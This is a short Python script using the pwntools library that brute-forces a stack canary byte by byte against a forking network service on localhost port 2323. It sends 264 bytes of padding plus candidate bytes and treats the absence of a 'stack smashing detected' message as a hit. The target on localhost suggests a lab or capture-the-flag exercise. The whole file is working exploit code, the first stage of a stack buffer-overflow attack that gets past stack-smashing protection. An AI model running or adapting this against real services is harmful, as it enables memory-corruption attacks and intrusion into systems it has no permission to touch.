#!/usr/bin/env python3

from pwn import *

# context.log_level = 'debug'

canary = bytearray()

padding = b'A' * 264

for i in range(8):  # 8 bytes for the canary
    for j in range(256):  # all values for a byte
        r = remote('localhost', 2323)
        # Maybe add short sleep here: otherwise, the child processes on the server are spawned so quick that the main memory runs full
        # sleep(0.07)

        log.debug(f'Sending canary {canary.hex() + hex(j)}')
        r.send(padding + canary + p8(j))  # Send next attempt

        try:
            r.recvuntil('stack smashing detected')
        except EOFError:  # No stack smashing detected => found correct byte
            log.info(f'Found next canary byte: {hex(j)}')
            canary += p8(j)
            log.info(f'Canary: {canary.hex()}')
            break
        finally:
            r.close()
